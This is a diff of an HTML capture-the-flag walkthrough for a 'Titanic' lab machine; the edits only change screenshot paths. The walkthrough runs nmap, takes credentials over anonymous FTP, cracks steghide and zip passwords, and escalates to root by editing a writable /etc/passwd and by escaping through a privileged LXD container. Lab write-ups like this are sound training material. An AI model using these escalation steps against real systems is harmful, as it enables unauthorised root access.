@@ -64,9 +64,8 @@
     <pre><code>nmap -sC -sV 192.168.0.139</code></pre>
     <p>The -sV flag adds version detection, the -sC flag runs some default scripts</p>
     <img src="/Titanic/Titanic/1.png">
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/1.png">
     <p><strong>Key Finding:</strong><br> - FTP (21): Anonymous login<br> - SSH (22): Requires credentials</p>
-    <a href="/Users/Shana Buhaisa P/Documents/Titanic/TItanicNmap.txt" download>Nmap Report</a>
+    <a href="/Titanic/TItanicNmap.txt" download>Nmap Report</a>
 
     <h2 id="ftp">📂 FTP Enumeration</h2>
     <p>We can see, “Anonymous FTP log in allowed” and we can see a “cred.txt” file. We can log in through anonymous and cat the text file.<br><br>
@@ -75,14 +74,14 @@
 ls
 get cred.txt
 exit</code></pre>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/2.png">
+    <img src="/Titanic/Titanic/2.png">
     <p>Check file content:</p>
     <pre><code>cat cred.txt</code></pre>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/3.png">
+    <img src="/Titanic/Titanic/3.png">
     <p><strong>Hint:</strong> "My name rhymes with 'back' and starts with a 'j'" ⇒ <strong>Username: jack</strong></p>
     <p>Password is Base64 encoded:</p>
     <pre><code>echo UXVlZW5zdG93bkAxOTk3 | base64 -d</code></pre>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/4.png">
+    <img src="/Titanic/Titanic/4.png">
     <p><strong>Credentials:</strong> Username: jack, Password: Queenstown@1997</p>
 
     <h2 id="ssh">🔐 SSH Access</h2>
@@ -90,30 +89,30 @@ exit</code></pre>
     <p>We got the acces! Let’s check if there is any files.</p>
     <pre><code>ls
 cat flag1.txt</code></pre>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/5.png">
+    <img src="/Titanic/Titanic/5.png">
 
     <h2 id="stego">🖼️ Steganography – titanic.jpg</h2>
     <p>There is also an image named “titanic.jpg” in it. We have to move this image to our operating system to open it.</p>
     <pre><code>scp jack@192.168.0.139:/home/jack/titanic.jpg /home/kali</code></pre>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/6.png">
+    <img src="/Titanic/Titanic/6.png">
     <p>Let’s use steghide on the image for checking if there is any hidden files in it. So for the passphrase, we need to osint to the Titanic movie.<br>Let’s create a wordlist using cewl: 
     </p>
     <pre><code>cewl "https://en.wikipedia.org/wiki/Titanic_(1997_film)" -w titaniclist</code></pre>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/7.png">
+    <img src="/Titanic/Titanic/7.png">
     <p>By using stegcracker , we can crack the passphrase.</p>
     <pre><code>stegcracker titanic.jpg titaniclist</code></pre>
     <p>Extract:</p>
     <pre><code>steghide extract -sf titanic.jpg</code></pre>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/8.png">
+    <img src="/Titanic/Titanic/8.png">
 
     <h2 id="zip">🔓 Cracking Zip File</h2>
     <p>The zip file “Dawson.zip” is also password protected. To find the password, we can use fcrackzip.</p>
     <pre><code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt Dawson.zip</code></pre>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/9.png">
+    <img src="/Titanic/Titanic/9.png">
     <p>By using the password <b>ilovejack</b>, we can unzip the file and check if there is any files in it.</p>
     <pre><code>unzip Dawson.zip
 cat Dewitt.txt</code></pre>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/10.png">
+    <img src="/Titanic/Titanic/10.png">
     <p>Looks like <b>NeverLetGo</b> is a password. Let’s take a look if there is any existing users other than jack.</p>
     <h2 id="users">👥 User Enumeration and Access</h2>
     <pre><code>cd /home
@@ -121,42 +120,42 @@ ls
 su rose</code></pre>
     <pre><code>ls
 cat flag2.txt</code></pre>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/11.png">
+    <img src="/Titanic/Titanic/11.png">
     <p>The rhyme shows that there is root and now we want to escalate our privilege.</p>
 
     <h2 id="linpeas">🧨 Privilege Escalation - linPEAS</h2>
     <p>Let’s run linpeas to exploit vulnerabilities. For that, let’s copy linpeas into rose.</p>
     <pre><code>linpea
 scp linpeas.sh rose@192.168.0.139:/home/rose</code></pre>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/12.png">
+    <img src="/Titanic/Titanic/12.png">
     <pre><code>./linpeas.sh</code></pre>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/13.png">
+    <img src="/Titanic/Titanic/13.png">
     <p>Looks like /etc/passwd and /etc/shadow are writable files. Let’s cat /etc.passwd and try to edit the uid of rose into “0’.</p>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/14.png">
+    <img src="/Titanic/Titanic/14.png">
     <p>Modify passwd:</p>
     <pre><code>nano /etc/passwd</code></pre>
     <p>Change UID to 0, then:</p>
     <pre><code>su rose
 cd /root
 cat flag3.txt</code></pre>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/15.png">
+    <img src="/Titanic/Titanic/15.png">
 
     <h2 id="lxd">🚀 Privilege Escalation - LXD Container Escape</h2>
     <p>Let’s download the build alpine using the GitHub repose.</p>
     <pre><code>git clone https://github.com/saghul/lxd-alpine-builder.git
 cd lxd-alpine-builder</code></pre>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/16.png">
+    <img src="/Titanic/Titanic/16.png">
     <p>Let’s copy the “alpine-v3.13-x86_64-20210218_0139.tar.gz” to jack.</p>
     <pre><code>scp alpine-v3.13-*.tar.gz jack@192.168.0.139:/home/jack</code></pre>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/17.png">
+    <img src="/Titanic/Titanic/17.png">
     <pre><code>
 lxc image import alpine-v3.13-*.tar.gz --alias alpine
 lxc init alpine ignite -c security.privileged=true
 lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
 lxc start ignite</code></pre>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/18.png">
+    <img src="/Titanic/Titanic/18.png">
     <pre><code>lxc exec ignite /bin/sh</code></pre>
-    <img src="/Users/Shana Buhaisa P/Documents/Titanic/Titanic/19.png">
+    <img src="/Titanic/Titanic/19.png">
     <pre><code>cd /mnt/root/root
 ls
 cat flag3.txt</code></pre>
